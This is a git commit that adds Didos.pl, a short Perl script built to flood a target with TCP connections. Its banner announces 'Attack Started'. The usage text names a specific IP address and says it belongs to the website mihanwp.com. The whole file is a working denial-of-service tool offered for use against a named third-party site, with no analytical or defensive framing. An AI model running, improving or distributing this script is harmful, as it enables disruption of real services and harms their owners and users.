ad41bc2cb9b924292c4400465ee94eabe7fdaa25
igray <82864026+cinzentoo@users.noreply.github.com>
2022-01-24 07:53:36 -0800

    Didos.pl

---
+++ Didos.pl
@@ -0,0 +1,30 @@
+#!/usr/bin/perl
+use IO::Socket;
+print q(
+
+
+How to use:
+
+: Perl file <host> <port>
+Examp : Perl Didos.pl 45.89.139.207 80  
+
+ip is for mihanwp.com Lol
+
+
+);
+my $host= shift;
+my $port= shift;
+if ($host!=null){
+printf ("\n      . . . . . . Attack Started = By cinzrentoo:) . . . . . . .\n");
+sleep (2);
+for ($i=0; ;$i--)
+{
+$len = length $form;
+
+
+$get = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$host", PeerPort => "$port") || redo;
+syswrite STDOUT, "+";
+}
+}
+else
+{exit(0);}
